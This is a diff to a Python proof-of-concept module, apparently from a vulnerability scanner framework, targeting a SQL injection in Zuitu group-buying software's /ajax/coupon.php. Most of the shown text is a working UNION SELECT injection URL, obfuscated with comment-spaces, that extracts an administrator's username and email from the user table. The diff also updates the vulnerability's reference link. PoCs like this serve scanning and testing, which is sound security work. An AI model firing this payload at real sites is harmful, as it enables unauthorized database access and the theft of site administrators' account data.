@@ -13,7 +13,7 @@ class Vuln(ABVuln):
     desc = '''
         最土团购 /ajax/coupon.php?action=consume&secret=8&id=2 php+数字类型注射漏洞。
     ''' # 漏洞描述
-    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=75525
+    ref = 'http://0day5.com/archives/2245/' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=75525
     cnvd_id = 'Unkonwn' # cnvd漏洞编号
     cve_id = 'Unkonwn' #cve编号
     product = 'Zuitu(最土团购)'  # 漏洞应用名称
@@ -33,7 +33,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            url=arg+"/ajax/coupon.php?action=consume&secret=8&id=2%27%29/**/and/**/1=2/**/union/**/select/**/1,2,0,4,5,6,concat%280x31,0x3a,username,0x3a,md5%2812%29,0x3a,email,0x3a%29,8,9,10,11,9999999999,13,14,15,16/**/from/**/user/**/where/**/manager=0x59/**/limit/**/0,1%23" 
+            url=arg+"/ajax/coupon.php?action=consume&secret=8&id=2%27%29/**/and/**/1=2/**/union/**/select/**/1,2,0,4,5,6,concat%280x31,0x3a,username,0x3a,md5%2812%29,0x3a,email,0x3a%29,8,9,10,11,9999999999,13,14,15/**/from/**/user/**/where/**/manager=0x59/**/limit/**/0,1%23" 
 
             code,head,res,errcode,_=hh.http(url)
                        
